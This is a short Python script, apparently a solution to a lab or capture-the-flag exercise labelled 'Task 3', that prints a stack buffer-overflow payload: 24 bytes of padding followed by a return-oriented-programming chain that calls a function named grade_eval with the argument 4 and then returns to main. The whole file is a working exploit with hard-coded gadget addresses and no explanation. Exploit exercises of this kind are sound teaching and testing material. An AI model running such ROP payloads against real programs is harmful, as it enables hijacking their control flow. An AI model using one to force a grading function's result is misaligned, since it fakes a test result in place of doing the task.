#!/usr/bin/env python3
"""Task 3: call grade_eval(4) through a short ROP chain."""
import struct
import sys

RET = 0x401a34
POP_RDI_RET = 0x401a33
GRADE_EVAL = 0x401978
MAIN = 0x4019b4

payload = (
    b"A" * 24
    + struct.pack("<QQQQQ", RET, POP_RDI_RET, 4, GRADE_EVAL, MAIN)
    + b"\n"
)

sys.stdout.buffer.write(payload)
